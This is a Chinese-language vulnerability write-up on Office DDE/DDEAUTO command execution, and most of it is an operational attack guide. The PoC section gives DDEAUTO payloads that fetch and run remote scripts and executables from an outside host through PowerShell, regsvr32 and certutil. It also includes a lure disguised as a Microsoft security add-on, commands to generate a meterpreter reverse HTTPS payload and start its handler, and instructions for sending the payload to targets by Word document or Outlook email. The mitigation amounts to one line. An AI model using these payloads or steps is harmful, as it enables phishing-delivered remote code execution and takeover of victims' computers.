# Office DDE漏洞

## 漏洞简介

 Microsoft Office 动态数据交换功能 DDE 允许攻击者在目标设备执行任意代码。该功能无需用户启用宏命令或者内存溢出等问题即可展开攻击，但微软认为这个不是安全问题因此并未修复。微软公司认为 DDE 只是功能而非安全问题因此无法删除或修复，但可以在未来使用 DDE 功能时向用户发出提醒。

## 漏洞影响范围

Word

Excwl

Outlook

## 漏洞分析

Sensepost的安全研究专家在几天之前曾发布过一篇漏洞报告，根据该报告所描述的内容，当目标用户打开了一个经过特殊制作的Office文档时，该漏洞可以在不使用恶意宏的情况下在目标主机中触发命令执行。虽然攻击者在实现这种攻击的过程中，需要利用社会工程学技术来欺骗用户点击两到三个消息提示框中的“确认”按钮，但绝大多数的终端用户都还是非常好骗的。

研究人员发现，通过利用DDEAUTO功能所提供的参数，攻击者可以远程利用PowerShell在目标主机中下载恶意Payload。DDE是Inter-Process Communication（进程间通信-IPC）机制下的一种遗留功能，最早可以追溯到1987年，它可以与一个由其他基于Microsoft Windows程序所创建的文档建立一条动态数据交换（DDE）链接（当你更新DDE域时，DDE域会插入新的信息，链接文档将能够查看到该信息）。

SensePost的研究人员发现，除了指定一个类似Excel这样的应用程序之外，攻击者还可以将其他应用程序的任意参数当作DDE的第一个参数，并引用其他的argument作为第二个参数来使用（大小不能超过255个字节）。

## 漏洞POC

### Word

打开一个新的Word文档，按下组合键Ctrl+F9，在文档中出现的“{}”之后，将以下代码复制到两个大括号之间，然后保存成为一个文件：

    DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"

更多Payload：

    DDEAUTO c:\Windows\System32\cmd.exe "/k powershell.exe -w hidden -nop -ep bypass Start-BitsTransfer -Source "http://willgenovese.com/hax/index.js"; -Destination "index.js" & start c:\WindowsSystem32cmd.exe /c cscript.exe index.js"
    DDEAUTO c:\windows\system32\cmd.exe "/k regsvr32 /s /n /u /i:http://willgenovese.com/hax/calc.sct scrobj.dll "
    DDEAUTO c:\windows\system32\cmd.exe "/k certutil -urlcache -split -f http://willgenovese.com/hax/test.exe && test.exe"
    DDEAUTO c:\Windows\System32\cmd.exe "/k powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://willgenovese.com/hax/evil.ps1');powershell -e $e "

除此之外，一个bash脚本并使用CactusTorch来自动化地在生成vbs/hta/js文件中生成反向HTTPS meterpreter Payload，你可以将它们插入到Word文档中以进行测试。脚本地址详见【CACTUSTORCH_DDEAUTO】目录。

研究发现，你还可以利用社会工程学技术来对程序所弹出的消息框信息进行处理，并增加用户点击“确认”的可能性。

    DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord\\..\\..\\..\\..\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden IEX (New-Object System.Net.WebClient).DownloadString('http://willgenovese.com/hax/evil.ps1'); # " "Microsoft Document Security Add-On"

虽然PowerShell webdl脚本可能更加容易实现一些，但是你可能会需要让你的Payload全部保存在一个文档之中，这样你就不需要再通过网络来调用额外的恶意代码了。Dave Kennedy已经更新了他的Unicorn Python脚本，该脚本可以生成一个msfvenom meterpreter Paload并当DDEAUTO被触发的时候得到一个base64 编码/解码的Payload。近期，Dave还修复了关于消息窗的问题。详情参见【unicorn】文件夹。

在Kali窗口中打开：

    IP=`ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'`
    git clone https://github.com/trustedsec/unicorn.git && cd unicorn
    python unicorn.py windows/meterpreter/reverse_https $IP 443 dde
    cat powershell_attack.txt  | xclip -selection clipboard | leafpad powershell_attack.txt

将上面这段Payload复制到Word文档之中，保存好文档之后将其发送给你的目标用户。接下来，在一个新的终端窗口中打开你的meterpreter handler来接收shell命令。

    IP=`ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'`
    msfconsole -qx "use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LHOST '$IP';set LPORT 443; set ExitOnSession false;exploit -j -z"

注：如果你需要修改你的外部IP地址，你可以更改其中的第一行代码：

    IP="$(dig +short myip.opendns.com @resolver1.opendns.com)"

### Outlook

你还可以在Outlook富文本电子邮件信息中触发这种功能，不过需要注意的是，对于Outlook 2013/2016来说，你需要在添加DDEAUTO Payload之前嵌入一个图片/表格/对象。

接下来跟之前一样，打开一个新的Word文档，然后按下键盘的组合键CTRL+F9，在文档中出现“{ }”之后将Payload拷贝到两个大括号之间，然后打开一个新的Outlook电子邮件信息。点击“格式化文本”（Format Text）标签，将消息格式修改为“富文本”（Rich Text）格式。

在消息内容（body）中任意复制粘贴一张图片文件。

从你的Word文档中复制DDEAuto Payload，将其粘贴到邮件内容（body）之中，然后输入收件人（目标用户）的邮件地址并点击发送按钮。接下来，Outlook会弹出一个DDE消息框，你只需要点击“取消”（No）即可。当你的目标用户收到这封电子邮件之后，除非他们点击了“回复”（Reply）按钮，否则将不会触发Payload的执行。如果他们点击了前两个消息框中的“确认”（Yes）按钮，则将会触发Payload的执行。

**更多情况参见：** [More1](http://willgenovese.com/office-ddeauto-attacks/) [More2](https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/)

## 漏洞复现

参见上文。

## 修复方案

下载该注册表后双击打开再点击合并即可。
下载Disable_DDEAuto.reg文件。

